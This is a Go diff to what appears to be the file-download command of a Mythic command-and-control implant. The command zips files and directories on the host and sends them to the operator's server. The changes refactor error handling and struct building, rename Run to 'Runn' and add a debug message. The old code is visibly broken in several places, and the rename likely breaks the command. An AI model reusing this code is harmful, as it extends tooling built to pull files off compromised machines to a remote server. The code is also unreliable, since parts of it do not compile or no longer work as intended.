@@ -22,42 +22,36 @@ func zipFilesAndDirectories(paths []string) (*bytes.Buffer, error) {
 	for _, path := range paths {
 		err := filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
 			if err != nil {
-				msg.SetError("error accessing path %s: %w", filePath, err)
-				return
+				return fmt.Errorf("error accessing path %s: %w", filePath, err)
 			}
 
 			relativePath, err := filepath.Rel(filepath.Dir(path), filePath)
 			if err != nil {
-				msg.SetError("error calculating relative path for %s: %w", filePath, err)
-				return
+				return fmt.Errorf("error calculating relative path for %s: %w", filePath, err)
 			}
 
 			if info.IsDir() {
 				_, err := zipWriter.Create(relativePath + "/")
 				if err != nil {
-					msg.SetError("error creating directory in zip: %w", err)
-				return
+					return fmt.Errorf("error creating directory in zip: %w", err)
 				}
 				return nil
 			}
 
 			fileWriter, err := zipWriter.Create(relativePath)
 			if err != nil {
-				msg.SetError("error creating file in zip: %w", err)
-				return
+				return fmt.Errorf("error creating file in zip: %w", err)
 			}
 
 			file, err := os.Open(filePath)
 			if err != nil {
-				msg.SetError("error opening file %s: %w", filePath, err)
-				return
+				return fmt.Errorf("error opening file %s: %w", filePath, err)
 			}
 			defer file.Close()
 
 			_, err = io.Copy(fileWriter, file)
 			if err != nil {
-				msg.SetError("error writing file to zip: %w", err)
-				return
+				return fmt.Errorf("error writing file to zip: %w", err)
 			}
 
 			return nil
@@ -83,10 +77,14 @@ type zipDownloadArgs struct {
 }
 
 // Run - Function that executes the download task
-func Run(task structs.Task) {
+func Runn(task structs.Task) {
 	msg := task.NewResponse()
-	args := &Arguments{}
-	err := json.Unmarshal([]byte(task.Params), args)
+	// debug
+	msg.UserOutput = "We are in Run"
+	task.Job.SendResponses <- msg
+	args := zipDownloadArgs{}
+	err := json.Unmarshal([]byte(task.Params), &args)
+	
 	if err != nil {
 		msg.SetError(fmt.Sprintf("Failed to parse parameters: %s", err.Error()))
 		task.Job.SendResponses <- msg
@@ -104,20 +102,20 @@ func Run(task structs.Task) {
 		}
 
 		// Prepare the download message with the zip data
-		downloadMsg := structs.SendFileToMythicStruct{}
-		downloadMsg.Task = &task
-		downloadMsg.IsScreenshot = false
-		downloadMsg.SendUserStatusUpdates = true
-		downloadMsg.Data = &zipBuffer.Bytes()
-		downloadMsg.FileName = "download.zip"
-		downloadMsg.FinishedTransfer = make(chan int, 2)
+		zipData := zipBuffer.Bytes() // Store the result in a variable
+		downloadMsg := structs.SendFileToMythicStruct{
+			Task:                 &task,
+			IsScreenshot:         false,
+			SendUserStatusUpdates: true,
+			Data:                 &zipData, // Use address of the variable
+			FileName:             "download.zip",
+			FinishedTransfer:     make(chan int, 2),
+		}
 
 		// Send the file to Mythic
 		task.Job.SendFileToMythic <- downloadMsg
 
 		handleTransferCompletion(task, downloadMsg)
-
-
 	} else {
 		// Handle files directly without compression
 		for _, path := range args.Paths {
@@ -134,6 +132,7 @@ func Run(task structs.Task) {
 				task.Job.SendResponses <- msg
 				return
 			}
+			defer file.Close() // Ensure the file is closed properly
 
 			fi, err := file.Stat()
 			if err != nil {
@@ -143,14 +142,15 @@ func Run(task structs.Task) {
 			}
 
 			// Prepare the download message for the file
-			downloadMsg := structs.SendFileToMythicStruct{}
-			downloadMsg.Task = &task
-			downloadMsg.IsScreenshot = false
-			downloadMsg.SendUserStatusUpdates = true
-			downloadMsg.File = file
-			downloadMsg.FileName = fi.Name()
-			downloadMsg.FullPath = fullPath
-			downloadMsg.FinishedTransfer = make(chan int, 2)
+			downloadMsg := structs.SendFileToMythicStruct{
+				Task:                 &task,
+				IsScreenshot:         false,
+				SendUserStatusUpdates: true,
+				File:                 file,
+				FileName:             fi.Name(),
+				FullPath:             fullPath,
+				FinishedTransfer:     make(chan int, 2),
+			}
 
 			// Send the file to Mythic
 			task.Job.SendFileToMythic <- downloadMsg
